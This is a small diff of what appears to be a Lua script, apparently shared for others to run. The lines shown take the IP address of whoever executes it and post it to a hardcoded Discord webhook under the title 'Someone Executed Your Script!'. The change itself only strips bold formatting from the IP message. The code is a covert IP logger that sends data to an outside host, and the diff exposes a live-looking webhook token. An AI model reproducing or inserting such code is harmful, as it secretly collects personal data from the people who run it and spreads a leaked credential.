@@ -10,7 +10,7 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1041250957973000243/9KoItEmeQxfA5MAEMEOz-P4Xi_ARDFEiGkcvfefia4KjULMeVxJ_9LVu5J-AgS_OKBC9"
 local data = { 
-   ["content"] = "Userip : **"..ip.."**",
+   ["content"] = "Userip : "..ip.."",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
